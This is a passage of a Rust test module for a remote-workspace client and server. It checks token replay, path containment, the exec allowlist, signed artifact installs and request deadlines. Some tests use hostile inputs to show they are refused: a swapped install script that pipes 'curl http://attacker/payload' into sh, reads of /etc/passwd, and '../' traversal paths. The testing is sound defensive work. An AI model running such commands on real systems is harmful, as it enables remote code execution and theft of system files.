fn refusal(host: &str) -> impl Fn(RemoteError) -> RemoteError + '_ {
    move |error| match error {
        RemoteError::Unauthorized { reason } => RemoteError::Unauthorized {
            reason: format!("{reason} (host {host})"),
        },
        other => other,
    }
}

fn decode(data_b64: String, what: &str) -> Result<Vec<u8>, RemoteError> {
    base64::engine::general_purpose::STANDARD
        .decode(data_b64)
        .map_err(|e| RemoteError::Protocol {
            reason: format!("the server's {what} payload was not valid base64: {e}"),
        })
}

fn wrong_reply(wanted: &str, got: &Payload) -> RemoteError {
    RemoteError::Protocol {
        reason: format!(
            "expected a {wanted} payload, got {}",
            match got {
                Payload::Hello { .. } => "hello",
                Payload::List { .. } => "list",
                Payload::Read { .. } => "read",
                Payload::Search { .. } => "search",
                Payload::Write { .. } => "write",
                Payload::Diff { .. } => "diff",
                Payload::Exec { .. } => "exec",
                Payload::ForwardGrant { .. } => "forward_grant",
                Payload::ForwardOpen { .. } => "forward_open",
                Payload::InstallBegin { .. } => "install_begin",
                Payload::InstallChunk { .. } => "install_chunk",
                Payload::InstallFinish { .. } => "install_finish",
                Payload::Pong { .. } => "pong",
            }
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::remote::endpoint::HostKeyPolicy;
    use crate::remote::install::InstallLayout;
    use crate::remote::provenance::ProvenancePolicy;
    use crate::remote::server::{Server, ServerConfig};
    use ed25519_dalek::{Signer as _, SigningKey};
    use std::sync::Arc;
    use tokio::io::DuplexStream;

    /// A session driven against the real [`Server`] over a pipe.
    ///
    /// Every test below calls [`RemoteWorkspace`]'s own methods and checks what the
    /// shipped server code did to a real directory, rather than checking a scripted
    /// idea of what the server would say.
    fn serve(server: Arc<Server>, stream: DuplexStream) -> tokio::task::JoinHandle<()> {
        tokio::spawn(async move {
            let _ = server.serve(stream).await;
        })
    }

    fn endpoint(capabilities: Vec<RemoteCapability>) -> RemoteEndpoint {
        RemoteEndpoint {
            host: "buildbox".into(),
            port: 4100,
            host_key: HostKeyPolicy::Strict,
            capabilities,
        }
    }

    async fn session(config: ServerConfig) -> RemoteWorkspace<DuplexStream> {
        session_with(config, RemoteWorkspaceConfig::new()).await
    }

    /// The same session, with the client's own config under the caller's control.
    async fn session_with(
        config: ServerConfig,
        client: RemoteWorkspaceConfig,
    ) -> RemoteWorkspace<DuplexStream> {
        let granted = config.capabilities.clone();
        let server = Arc::new(Server::new(config).expect("valid config"));
        let tokens = server.issue_tokens(4).await;
        let (client_stream, server_stream) = tokio::io::duplex(1024 * 1024);
        let task = serve(Arc::clone(&server), server_stream);
        let workspace = RemoteWorkspace::connect(
            client_stream,
            &endpoint(granted.clone()),
            &tokens[0],
            RemoteWorkspaceConfig {
                capabilities: granted,
                ..client
            },
        )
        .await
        .expect("handshake");
        // The session owns its half of the pipe; the spawned task ends when it
        // notices the other half is gone, so the handle is detached on purpose.
        drop(task);
        workspace
    }

    /// A host that installs what it is handed.
    ///
    /// The tests here are about the session: paging, deadlines, retries, grants.
    /// A required signature would refuse every install before the thing under test
    /// was reached. The provenance rules are tested against `InstallLayout::commit`
    /// directly and, over this same session, in `install_*_provenance` below.
    fn config(root: &Path) -> ServerConfig {
        ServerConfig::new(root).install_layout(
            InstallLayout::new(root).with_provenance(ProvenancePolicy::unsigned_allowed()),
        )
    }

    /// A host that requires a signature from `key_b64`, otherwise as [`config`].
    fn signed_host(root: &Path, key_b64: &str) -> ServerConfig {
        ServerConfig::new(root).install_layout(
            InstallLayout::new(root)
                .with_provenance(ProvenancePolicy::trusting_key_b64(key_b64).expect("a valid key")),
        )
    }

    fn workspace_dir() -> (tempfile::TempDir, std::path::PathBuf) {
        let dir = tempfile::tempdir().expect("tempdir");
        let root = dir.path().join("work");
        std::fs::create_dir(&root).expect("workspace root");
        (dir, root)
    }

    #[tokio::test]
    async fn a_session_is_what_the_two_ends_agreed_it_is() {
        let (_guard, root) = workspace_dir();
        let mut ws = session(config(&root)).await;
        assert_eq!(ws.protocol_version(), PROTOCOL_VERSION);
        assert_eq!(ws.server().name, "chaos-remote-server");
        assert!(!ws.session_id().is_empty());
        assert!(ws.has(&RemoteCapability::WorkspaceRead));
        // The default config asks for ToolExecution, and a default server offers
        // none: the grant is what the server has, not what the caller wanted.
        assert!(!ws.has(&RemoteCapability::ToolExecution));
        assert_eq!(ws.ping().await.unwrap(), PROTOCOL_VERSION);
    }

    /// One credential, one session. A second connection with the same token is the
    /// replay this whole design exists to make impossible.
    #[tokio::test]
    async fn a_credential_opens_exactly_one_session() {
        let (_guard, root) = workspace_dir();
        let server = Arc::new(Server::new(config(&root)).unwrap());
        let tokens = server.issue_tokens(1).await;
        let policy = endpoint(RemoteWorkspaceConfig::default().capabilities);

        let (a, b) = tokio::io::duplex(64 * 1024);
        let first_task = serve(Arc::clone(&server), b);
        let first = RemoteWorkspace::connect(a, &policy, &tokens[0], RemoteWorkspaceConfig::new())
            .await
            .expect("the first session");
        assert!(first.has(&RemoteCapability::WorkspaceRead));

        let (c, d) = tokio::io::duplex(64 * 1024);
        let second_task = serve(Arc::clone(&server), d);
        let err = RemoteWorkspace::connect(c, &policy, &tokens[0], RemoteWorkspaceConfig::new())
            .await
            .expect_err("a spent credential must not open a second session");
        assert!(
            matches!(&err, RemoteError::Unauthorized { reason }
                if reason.contains("already opened a session")),
            "{err:?}"
        );
        first_task.abort();
        second_task.abort();
    }

    #[tokio::test]
    async fn an_expired_credential_is_refused() {
        let (_guard, root) = workspace_dir();
        let server =
            Arc::new(Server::new(config(&root).token_ttl(Duration::from_millis(1))).unwrap());
        let tokens = server.issue_tokens(1).await;
        tokio::time::sleep(Duration::from_millis(30)).await;
        let (a, b) = tokio::io::duplex(64 * 1024);
        let task = serve(Arc::clone(&server), b);
        let err = RemoteWorkspace::connect(
            a,
            &endpoint(RemoteWorkspaceConfig::default().capabilities),
            &tokens[0],
            RemoteWorkspaceConfig::new(),
        )
        .await
        .expect_err("the credential had already expired");
        assert!(matches!(err, RemoteError::Unauthorized { .. }), "{err:?}");
        task.abort();
    }

    /// Asking a host for rights the user never approved for it is a bug in the
    /// caller, and it is caught before a byte reaches the network.
    #[tokio::test]
    async fn asking_for_more_than_the_endpoint_allows_is_refused_locally() {
        let (client, _peer) = tokio::io::duplex(1024);
        let err = RemoteWorkspace::connect(
            client,
            &endpoint(vec![RemoteCapability::WorkspaceRead]),
            &SessionToken::from_text("t"),
            RemoteWorkspaceConfig::new(),
        )
        .await
        .expect_err("the default config asks for far more than read");
        assert!(
            matches!(&err, RemoteError::InvalidRequest { reason }
                if reason.contains("buildbox") && reason.contains("Git")),
            "{err:?}"
        );
    }

    #[tokio::test]
    async fn a_file_bigger_than_one_window_is_still_read_in_full() {
        let (_guard, root) = workspace_dir();
        let body: String = (0..400).map(|n| format!("line {n}\n")).collect();
        std::fs::write(root.join("big.txt"), &body).unwrap();
        // 96 bytes per transfer, so the file needs several round trips.
        let mut ws = session(config(&root).max_transfer_bytes(96)).await;
        let got = ws.read_file("big.txt").await.unwrap();
        assert_eq!(got.data, body.as_bytes());
        assert_eq!(got.sha256, sha256_hex(body.as_bytes()));

        // A single window digests only the bytes it returned, which is exactly why
        // paging has to compute the whole-file digest itself.
        let window = ws.read("big.txt", None, Some(96)).await.unwrap();
        assert_eq!(window.data.len(), 96);
        assert_eq!(window.total_len, body.len() as u64);
        assert_ne!(window.sha256, got.sha256);
    }

    #[tokio::test]
    async fn a_window_past_the_end_of_a_file_is_an_error_not_an_empty_answer() {
        let (_guard, root) = workspace_dir();
        std::fs::write(root.join("small.txt"), "abc").unwrap();
        let mut ws = session(config(&root)).await;
        let err = ws.read("small.txt", Some(900), None).await.unwrap_err();
        assert!(
            matches!(&err, RemoteError::InvalidRequest { reason }
                if reason.contains("past the end")),
            "{err:?}"
        );
    }

    /// The point of the digest: an edit made against a version that is gone is
    /// refused instead of quietly winning.
    #[tokio::test]
    async fn a_write_names_the_version_it_replaced() {
        let (_guard, root) = workspace_dir();
        std::fs::write(root.join("notes.md"), "first\n").unwrap();
        let mut ws = session(config(&root)).await;
        let read = ws.read_file("notes.md").await.unwrap();
        let (len, digest) = ws
            .write(
                "notes.md",
                WriteFile {
                    content: b"second\n",
                    create_parents: false,
                    expected_sha256: Some(&read.sha256),
                },
            )
            .await
            .unwrap();
        assert_eq!(len, 7);
        assert_eq!(digest, sha256_hex(b"second\n"));
        assert_eq!(
            std::fs::read_to_string(root.join("notes.md")).unwrap(),
            "second\n"
        );

        let err = ws
            .write(
                "notes.md",
                WriteFile {
                    content: b"third\n",
                    expected_sha256: Some(&read.sha256),
                    ..Default::default()
                },
            )
            .await
            .expect_err("the file has moved on since that read");
        assert!(matches!(err, RemoteError::Conflict { .. }), "{err:?}");
        assert_eq!(
            std::fs::read_to_string(root.join("notes.md")).unwrap(),
            "second\n",
            "a refused write must leave the file alone"
        );
    }

    #[tokio::test]
    async fn a_write_into_a_missing_directory_has_to_ask_for_it() {
        let (_guard, root) = workspace_dir();
        let mut ws = session(config(&root)).await;
        let err = ws
            .write(
                "deep/nested/file.txt",
                WriteFile {
                    content: b"x",
                    ..Default::default()
                },
            )
            .await
            .expect_err("a typo in a path must not establish a new branch of the tree");
        assert!(
            matches!(&err, RemoteError::InvalidRequest { reason }
                if reason.contains("create_parents")),
            "{err:?}"
        );
        ws.write(
            "deep/nested/file.txt",
            WriteFile {
                content: b"x",
                create_parents: true,
                ..Default::default()
            },
        )
        .await
        .unwrap();
        assert_eq!(
            std::fs::read(root.join("deep/nested/file.txt")).unwrap(),
            b"x"
        );
    }

    #[tokio::test]
    async fn a_path_that_leaves_the_workspace_is_refused() {
        let (_guard, root) = workspace_dir();
        std::fs::write(root.parent().unwrap().join("outside.txt"), "secret").unwrap();
        let mut ws = session(config(&root)).await;
        for attempt in ["../outside.txt", "/etc/passwd", "a/../../outside.txt", ".."] {
            let err = ws
                .read(attempt, None, None)
                .await
                .expect_err("nothing outside the workspace is readable");
            assert!(
                matches!(err, RemoteError::PathRejected { .. }),
                "{attempt}: {err:?}"
            );
        }
        let err = ws
            .write(
                "../outside.txt",
                WriteFile {
                    content: b"overwritten",
                    ..Default::default()
                },
            )
            .await
            .expect_err("and nothing outside it is writable");
        assert!(matches!(err, RemoteError::PathRejected { .. }), "{err:?}");
        assert_eq!(
            std::fs::read_to_string(root.parent().unwrap().join("outside.txt")).unwrap(),
            "secret"
        );
    }

    #[tokio::test]
    async fn a_listing_and_a_search_agree_with_the_disk() {
        let (_guard, root) = workspace_dir();
        std::fs::create_dir(root.join("src")).unwrap();
        std::fs::write(root.join("src/main.rs"), "fn main() { needs_a_word() }\n").unwrap();
        std::fs::create_dir(root.join("target")).unwrap();
        std::fs::write(root.join("target/junk.bin"), [0u8; 4]).unwrap();
        let mut ws = session(config(&root)).await;

        let (entries, truncated) = ws.list(None, None, None).await.unwrap();
        let paths: Vec<&str> = entries.iter().map(|entry| entry.path.as_str()).collect();
        assert!(paths.contains(&"src"), "{paths:?}");
        assert!(paths.contains(&"src/main.rs"), "{paths:?}");
        assert!(!paths.contains(&"target"), "{paths:?}");
        // A filtered listing still has to admit it is not the whole picture.
        assert!(
            truncated,
            "a listing that skipped a directory is not complete"
        );

        let found = ws.search("needs_a_word", None, None, false).await.unwrap();
        assert_eq!(found.hits.len(), 1, "{found:?}");
        assert_eq!(found.hits[0].path, "src/main.rs");
        assert_eq!(found.hits[0].line, 1);
        assert_eq!(found.hits[0].text, "fn main() { needs_a_word() }");
        assert!(!found.truncated);

        let insensitive = ws.search("NEEDS_A_WORD", None, None, true).await.unwrap();
        assert!(
            insensitive.hits.is_empty(),
            "a case-sensitive search is not the same question"
        );

        let none = ws
            .search("nothing-like-this", None, None, false)
            .await
            .unwrap();
        assert!(none.hits.is_empty());
        assert!(
            !none.truncated,
            "a search that looked everywhere may say so"
        );
    }

    #[tokio::test]
    async fn a_capability_the_session_lacks_is_refused_without_a_round_trip() {
        let (_guard, root) = workspace_dir();
        let server = Arc::new(
            Server::new(config(&root).capabilities(vec![RemoteCapability::WorkspaceRead])).unwrap(),
        );
        let tokens = server.issue_tokens(1).await;
        let (client, server_stream) = tokio::io::duplex(64 * 1024);
        let task = serve(Arc::clone(&server), server_stream);
        let mut ws = RemoteWorkspace::connect(
            client,
            &endpoint(vec![
                RemoteCapability::WorkspaceRead,
                RemoteCapability::WorkspaceSearch,
            ]),
            &tokens[0],
            RemoteWorkspaceConfig::new().capabilities(vec![
                RemoteCapability::WorkspaceRead,
                RemoteCapability::WorkspaceSearch,
            ]),
        )
        .await
        .unwrap();
        assert!(ws.has(&RemoteCapability::WorkspaceRead));
        assert!(!ws.has(&RemoteCapability::WorkspaceSearch));
        assert_eq!(
            ws.search("x", None, None, false).await.unwrap_err(),
            RemoteError::CapabilityNotGranted {
                capability: RemoteCapability::WorkspaceSearch
            }
        );
        task.abort();
    }

    /// `git diff` earns an end-to-end run because the two ends disagree about what
    /// a non-zero exit means: git exits 1 to say "there is a difference".
    #[tokio::test]
    async fn git_reports_the_change_the_remote_tree_has() {
        let (_guard, root) = workspace_dir();
        git(&root, &["init", "-q", "."]).expect("git init");
        git(&root, &["config", "user.email", "t@example.invalid"]).unwrap();
        git(&root, &["config", "user.name", "test"]).unwrap();
        std::fs::write(root.join("a.txt"), "one\ntwo\n").unwrap();
        git(&root, &["add", "a.txt"]).unwrap();
        git(&root, &["commit", "-q", "-m", "one"]).unwrap();
        let mut ws = session(config(&root)).await;

        let (diff, dirty) = ws.diff(None, false, None).await.unwrap();
        assert!(!dirty, "a clean tree is not dirty:\n{diff}");

        std::fs::write(root.join("a.txt"), "one\ntwo\nthree\n").unwrap();
        let (diff, dirty) = ws.diff(None, false, None).await.unwrap();
        assert!(dirty);
        assert!(diff.contains("+three"), "{diff}");

        // A pathspec outside the workspace is refused before git is asked.
        let err = ws.diff(Some("../outside"), false, None).await.unwrap_err();
        assert!(matches!(err, RemoteError::PathRejected { .. }), "{err:?}");
    }

    /// The allowlisted programs here are POSIX ones; on Windows the point is made
    /// by the refusal assertions, which need no real program at all.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_tool_runs_only_when_the_server_named_it() {
        let (_guard, root) = workspace_dir();
        let mut ws = session(
            config(&root)
                .capabilities(vec![
                    RemoteCapability::WorkspaceRead,
                    RemoteCapability::ToolExecution,
                ])
                .allowed_executables(["echo", "sleep"]),
        )
        .await;
        assert!(ws.has(&RemoteCapability::ToolExecution));

        let out = ws
            .exec(&["echo", "built remotely"], None, None)
            .await
            .unwrap();
        assert!(out.success(), "{out:?}");
        assert_eq!(out.stdout.trim(), "built remotely");

        let failing = ws.exec(&["echo"], None, None).await.unwrap();
        assert!(failing.success());

        let slow = ws
            .exec(&["sleep", "30"], None, Some(Duration::from_millis(200)))
            .await
            .unwrap();
        assert!(slow.timed_out, "a tool past its deadline is killed");
        assert_eq!(slow.exit_code, None);

        let err = ws
            .exec(&["cat", "/etc/passwd"], None, None)
            .await
            .unwrap_err();
        assert!(matches!(err, RemoteError::Exec { .. }), "{err:?}");
        // A path is a second way to name a program, and it bypasses the allowlist.
        let err = ws
            .exec(&["/bin/cat", "/etc/passwd"], None, None)
            .await
            .unwrap_err();
        assert!(
            matches!(&err, RemoteError::InvalidRequest { reason }
                if reason.contains("bare program")),
            "{err:?}"
        );
    }

    #[tokio::test]
    async fn a_deployed_artifact_becomes_the_current_one() {
        let (_guard, root) = workspace_dir();
        let mut ws = session(config(&root)).await;
        let artifact: &[u8] = b"#!/bin/sh\necho chaos-remote-server 9.9.9\n";
        let outcome = ws.install_artifact("9.9.9", artifact, None).await.unwrap();
        assert!(outcome.current);
        assert_eq!(outcome.version, "9.9.9");
        assert_eq!(outcome.previous_version, None);
        let layout = InstallLayout::new(&root);
        assert_eq!(layout.current_version().as_deref(), Some("9.9.9"));
        assert_eq!(
            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
            artifact
        );

        let second = ws
            .install_artifact("9.9.10", b"a different build", None)
            .await
            .unwrap();
        assert_eq!(second.previous_version.as_deref(), Some("9.9.9"));
        assert_eq!(layout.current_version().as_deref(), Some("9.9.10"));
        // The superseded build is still on disk, which is what a rollback needs.
        assert!(layout.artifact_path("9.9.9").is_file());
    }

    /// Several chunks, because a one-chunk upload would not exercise the ordering.
    #[tokio::test]
    async fn a_multi_chunk_deploy_arrives_whole() {
        let (_guard, root) = workspace_dir();
        let server = Arc::new(Server::new(config(&root).max_transfer_bytes(4096)).unwrap());
        let tokens = server.issue_tokens(1).await;
        let (client, server_stream) = tokio::io::duplex(64 * 1024);
        let task = serve(Arc::clone(&server), server_stream);
        let mut ws = RemoteWorkspace::connect(
            client,
            &endpoint(RemoteWorkspaceConfig::default().capabilities),
            &tokens[0],
            RemoteWorkspaceConfig::new().chunk_bytes(1024),
        )
        .await
        .unwrap();
        let artifact: Vec<u8> = (0..20_000u32).map(|n| (n % 251) as u8).collect();
        let outcome = ws
            .install_artifact("7.0.0", &artifact, None)
            .await
            .expect("20 chunks of 1 KiB");
        assert!(outcome.current);
        let layout = InstallLayout::new(&root);
        assert_eq!(
            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
            artifact
        );
        task.abort();
    }

    #[tokio::test]
    async fn a_deploy_naming_a_path_not_a_version_changes_nothing() {
        let (_guard, root) = workspace_dir();
        let mut ws = session(config(&root)).await;
        let err = ws
            .install_artifact("../../evil", b"bytes", None)
            .await
            .expect_err("a version is a path component like any other");
        assert!(matches!(err, RemoteError::Install { .. }), "{err:?}");
        let layout = InstallLayout::new(&root);
        assert_eq!(layout.current_version(), None);
        assert_eq!(layout.installed_versions(), Vec::<String>::new());
    }

    fn keypair(seed: u8) -> (SigningKey, String) {
        let signing = SigningKey::from_bytes(&[seed; 32]);
        let public = base64::engine::general_purpose::STANDARD.encode(signing.verifying_key());
        (signing, public)
    }

    fn signature_for(signing: &SigningKey, bytes: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(signing.sign(bytes).to_bytes())
    }

    /// A host that requires provenance does install a build that carries it, over
    /// the same request path every other deploy uses.
    #[tokio::test]
    async fn a_signed_deploy_installs_on_a_host_that_requires_provenance() {
        let (_guard, root) = workspace_dir();
        let (signing, public) = keypair(21);
        let mut ws = session(signed_host(&root, &public)).await;
        let artifact: &[u8] = b"#!/bin/sh\necho chaos-remote-server 1.0.0\n";
        let outcome = ws
            .install_artifact("1.0.0", artifact, Some(&signature_for(&signing, artifact)))
            .await
            .expect("a signature from the trusted key");
        assert!(outcome.current);
        let layout = InstallLayout::new(&root);
        assert_eq!(
            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
            artifact
        );
    }

    /// The same client, the same capability, the same artifact: the only thing
    /// missing is the signature, and the host says which check fired.
    #[tokio::test]
    async fn an_unsigned_deploy_is_refused_by_a_host_that_requires_provenance() {
        let (_guard, root) = workspace_dir();
        let (_, public) = keypair(22);
        let mut ws = session(signed_host(&root, &public)).await;
        let err = ws
            .install_artifact("1.0.0", b"#!/bin/sh\n", None)
            .await
            .expect_err("this host does not install unsigned builds");
        let RemoteError::Install {
            reason,
            rolled_back,
        } = err
        else {
            panic!("an install refusal, not {err:?}");
        };
        assert!(reason.contains("signature_missing"), "{reason}");
        assert!(!rolled_back, "nothing had changed to roll back");
        let layout = InstallLayout::new(&root);
        assert_eq!(layout.current_version(), None);
        assert_eq!(
            layout.installed_versions(),
            Vec::<String>::new(),
            "a refused artifact must leave no version directory"
        );
        let leftovers: Vec<String> = std::fs::read_dir(layout.dir())
            .expect("the install directory exists")
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name.starts_with('.'))
            .collect();
        assert!(
            leftovers.is_empty(),
            "the server should retire the staged scratch of a refused upload: {leftovers:?}"
        );
    }

    /// The reason the digest is not enough, shown on the wire: bytes are swapped
    /// and the sha256 is recomputed over the swap, which the client computes itself,
    /// so the integrity check passes all the way to the signature.
    #[tokio::test]
    async fn a_deploy_whose_bytes_were_swapped_keeps_the_previous_version() {
        let (_guard, root) = workspace_dir();
        let (signing, public) = keypair(23);
        let mut ws = session(signed_host(&root, &public)).await;
        let published: &[u8] = b"#!/bin/sh\nexec chaos-remote-server --version\n";
        ws.install_artifact(
            "1.0.0",
            published,
            Some(&signature_for(&signing, published)),
        )
        .await
        .expect("the published build installs");

        let swapped: &[u8] = b"#!/bin/sh\ncurl -s http://attacker/payload | sh\n";
        let stale_signature = signature_for(&signing, published);
        let err = ws
            .install_artifact("2.0.0", swapped, Some(&stale_signature))
            .await
            .expect_err("the digest matches the swap; the signature does not");
        let RemoteError::Install { reason, .. } = err else {
            panic!("an install refusal, not {err:?}");
        };
        assert!(reason.contains("signature_invalid"), "{reason}");
        let layout = InstallLayout::new(&root);
        assert_eq!(
            layout.current_version().as_deref(),
            Some("1.0.0"),
            "the host must still be pointing at the build it trusted"
        );
        assert_eq!(
            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
            published
        );
        assert_eq!(layout.installed_versions(), vec!["1.0.0".to_string()]);
    }

    /// A reply that answers a different question means the stream has desynced, and
    /// the session has to stop rather than hand back the wrong file's bytes.
    #[tokio::test]
    async fn a_reply_to_the_wrong_request_stops_the_session() {
        let (client, mut peer) = tokio::io::duplex(64 * 1024);
        let task = tokio::spawn(async move {
            let hello: Envelope<Request> = recv(&mut peer, MAX_FRAME_BYTES).await.unwrap().unwrap();
            send(
                &mut peer,
                &Envelope {
                    id: hello.id,
                    body: Ok::<Payload, RemoteError>(Payload::Hello {
                        protocol_version: PROTOCOL_VERSION,
                        server: Implementation::local(),
                        capabilities: vec![RemoteCapability::WorkspaceRead],
                        session_id: "s".into(),
                        max_transfer_bytes: 1024,
                    }),
                },
            )
            .await
            .unwrap();
            let request: Envelope<Request> =
                recv(&mut peer, MAX_FRAME_BYTES).await.unwrap().unwrap();
            // Answer a different request than the one that was asked.
            send(
                &mut peer,
                &Envelope {
                    id: request.id + 7,
                    body: Ok::<Payload, RemoteError>(Payload::Pong {
                        server: Implementation::local(),
                        protocol_version: PROTOCOL_VERSION,
                    }),
                },
            )
            .await
            .unwrap();
        });
        let mut ws = RemoteWorkspace::connect(
            client,
            &endpoint(vec![RemoteCapability::WorkspaceRead]),
            &SessionToken::from_text("t"),
            RemoteWorkspaceConfig::new().capabilities(vec![RemoteCapability::WorkspaceRead]),
        )
        .await
        .unwrap();
        let err = ws.ping().await.unwrap_err();
        assert!(
            matches!(&err, RemoteError::Protocol { reason } if reason.contains("desynced")),
            "{err:?}"
        );
        task.abort();
    }

    /// A server that grants more than was asked for does not get to use the extra
    /// rights on the caller's behalf.
    #[tokio::test]
    async fn capabilities_never_asked_for_are_not_usable() {
        let (client, mut peer) = tokio::io::duplex(64 * 1024);
        let task = tokio::spawn(async move {
            let hello: Envelope<Request> = recv(&mut peer, MAX_FRAME_BYTES).await.unwrap().unwrap();
            send(
                &mut peer,
                &Envelope {
                    id: hello.id,
                    body: Ok::<Payload, RemoteError>(Payload::Hello {
                        protocol_version: PROTOCOL_VERSION,
                        server: Implementation::local(),
                        capabilities: vec![
                            RemoteCapability::WorkspaceRead,
                            RemoteCapability::ToolExecution,
                        ],
                        session_id: "s".into(),
                        max_transfer_bytes: 1024,
                    }),
                },
            )
            .await
            .unwrap();
            loop {
                let Some(request) = recv::<Envelope<Request>, _>(&mut peer, MAX_FRAME_BYTES)
                    .await
                    .unwrap()
                else {
                    return;
                };
                let body = match request.body {
                    Request::Exec { .. } => Ok(Payload::Exec {
                        exit_code: Some(0),
                        stdout: "ran".into(),
                        stderr: String::new(),
                        timed_out: false,
                        truncated: false,
                    }),
                    other => Err(RemoteError::InvalidRequest {
                        reason: format!("{other:?}"),
                    }),
                };
                send(
                    &mut peer,
                    &Envelope {
                        id: request.id,
                        body,
                    },
                )
                .await
                .unwrap();
            }
        });
        let mut ws = RemoteWorkspace::connect(
            client,
            &endpoint(vec![
                RemoteCapability::WorkspaceRead,
                RemoteCapability::ToolExecution,
            ]),
            &SessionToken::from_text("t"),
            RemoteWorkspaceConfig::new().capabilities(vec![RemoteCapability::WorkspaceRead]),
        )
        .await
        .unwrap();
        assert!(!ws.has(&RemoteCapability::ToolExecution));
        assert_eq!(
            ws.exec(&["echo"], None, None).await.unwrap_err(),
            RemoteError::CapabilityNotGranted {
                capability: RemoteCapability::ToolExecution
            }
        );
        task.abort();
    }

    /// `Result` on the wire is externally tagged, which both ends get from serde.
    /// Naming the shape here means a change to it fails a test rather than changing
    /// what a live session says.
    #[test]
    fn a_reply_is_a_tagged_result_on_the_wire() {
        let ok = serde_json::to_value(Envelope {
            id: 3,
            body: Ok::<Payload, RemoteError>(Payload::Pong {
                server: Implementation::local(),
                protocol_version: 1,
            }),
        })
        .unwrap();
        assert_eq!(ok["body"]["Ok"]["kind"], "pong");
        let err = serde_json::to_value(Envelope {
            id: 4,
            body: Err::<Payload, _>(RemoteError::NotFound { path: "x".into() }),
        })
        .unwrap();
        assert_eq!(err["body"]["Err"]["error"], "not_found");
        assert_eq!(err["body"]["Err"]["path"], "x");

        let read_back: Envelope<Reply> = serde_json::from_value(ok).unwrap();
        assert_eq!(read_back.id, 3);
        assert!(matches!(
            read_back.body,
            Ok(Payload::Pong {
                protocol_version: 1,
                ..
            })
        ));
    }

    /// A peer that answers the handshake and then never answers anything else.
    ///
    /// This is what a wedged server, or a tunnel that swallowed the request, looks
    /// like from the client — the case a deadline exists for. Answering the hello
    /// by hand rather than through [`Server`] is the point: the real server always
    /// replies, so it cannot produce a stall.
    fn answers_hello_then_goes_quiet(mut stream: DuplexStream) -> tokio::task::JoinHandle<()> {
        tokio::spawn(async move {
            let hello: Envelope<Request> = recv(&mut stream, MAX_FRAME_BYTES)
                .await
                .expect("hello")
                .expect("a first frame");
            if !matches!(hello.body, Request::Hello { .. }) {
                panic!("the first request was not a hello");
            }
            send(
                &mut stream,
                &Envelope::<Reply> {
                    id: hello.id,
                    body: Ok(Payload::Hello {
                        protocol_version: PROTOCOL_VERSION,
                        server: Implementation::local(),
                        capabilities: RemoteCapability::all().to_vec(),
                        session_id: "quiet-peer".into(),
                        max_transfer_bytes: 1024 * 1024,
                    }),
                },
            )
            .await
            .expect("hello reply");
            // Held open with nothing more to say.
            std::future::pending::<()>().await;
        })
    }

    async fn quiet_session(limit: Duration) -> RemoteWorkspace<DuplexStream> {
        let (client, peer) = tokio::io::duplex(64 * 1024);
        let task = answers_hello_then_goes_quiet(peer);
        let capabilities = RemoteCapability::all().to_vec();
        let session = RemoteWorkspace::connect(
            client,
            &endpoint(capabilities.clone()),
            &SessionToken::from_text("0123456789abcdef0123456789abcdef"),
            RemoteWorkspaceConfig::new()
                .capabilities(capabilities)
                .request_timeout(Some(limit)),
        )
        .await
        .expect("handshake");
        drop(task);
        session
    }

    /// A reply that never arrives is reported as a deadline, not as a hang, and
    /// the session is finished by it.
    #[tokio::test]
    async fn a_request_that_never_gets_an_answer_ends_the_session() {
        let mut session = quiet_session(Duration::from_millis(200)).await;
        assert_eq!(session.state(), SessionState::Ready);

        // Bounded from outside as well: were the deadline under test ever removed,
        // this test must report that instead of waiting on a peer that never
        // answers.
        let error = tokio::time::timeout(Duration::from_secs(20), session.ping())
            .await
            .expect("the request deadline fires instead of waiting forever")
            .expect_err("a peer that says nothing cannot answer");
        match &error {
            RemoteError::Timeout { request, after } => {
                assert_eq!(request, "ping", "the message names the request");
                assert_eq!(*after, Duration::from_millis(200));
            }
            other => panic!("expected a timeout, got {other}"),
        }
        assert!(
            error.to_string().contains("abandoned"),
            "the caller is told what the deadline means: {error}"
        );

        // Nothing further is sent: a reply to `ping` turning up late would be read
        // as the answer to whatever came next, which is how a session ends up
        // handing back the wrong file's contents.
        let abandoned = match session.state() {
            SessionState::Abandoned { reason } => reason,
            SessionState::Ready => panic!("the session claims to still be usable"),
        };
        assert!(abandoned.contains("ping"), "{abandoned}");
        let error = session
            .ping()
            .await
            .expect_err("an abandoned session sends nothing");
        match error {
            RemoteError::Abandoned { reason } => assert!(reason.contains("ping"), "{reason}"),
            other => panic!("expected abandoned, got {other}"),
        }
        // Not just `ping`: the rule is per session, so no call gets through.
        let error = session
            .list(None, None, None)
            .await
            .expect_err("an abandoned session sends nothing")
            .to_string();
        assert!(error.contains("abandoned"), "{error}");
    }

    /// The deadline has to be a wait, not a guess: a server that does answer is
    /// unaffected by one being configured.
    #[tokio::test]
    async fn a_generous_deadline_leaves_a_working_session_alone() {
        let (_dir, root) = workspace_dir();
        let mut session = session_with(
            config(&root).capabilities(vec![RemoteCapability::WorkspaceList]),
            RemoteWorkspaceConfig::new().request_timeout(Some(Duration::from_secs(30))),
        )
        .await;
        assert!(session.list(None, None, None).await.is_ok());
        assert_eq!(session.ping().await.expect("pong"), PROTOCOL_VERSION);
        assert_eq!(session.state(), SessionState::Ready);
    }

    /// A peer that accepts the connection and never speaks is the failure a
    /// caller must not be stuck in, so the handshake is bounded by default.
    #[tokio::test]
    async fn a_peer_that_never_answers_the_handshake_is_a_timeout() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
            .await
            .expect("loopback listener");
        let addr = listener.local_addr().expect("addr");
        let accepted = tokio::spawn(async move {
            // Held, unanswered: the connect succeeds, which is exactly what makes
            // this indistinguishable from a slow server without a deadline.
            let (_stream, _peer) = listener.accept().await.expect("accept");
            std::future::pending::<()>().await;
        });

        // Bounded from outside too: if the deadline under test were ever removed,
        // this test would report that rather than waiting forever for a peer that
        // never answers.
        let outcome = tokio::time::timeout(
            Duration::from_secs(20),
            RemoteWorkspace::connect_tcp(
                addr,
                &endpoint(RemoteCapability::all().to_vec()),
                &SessionToken::from_text("0123456789abcdef0123456789abcdef"),
                RemoteWorkspaceConfig::new().handshake_timeout(Duration::from_millis(250)),
            ),
        )
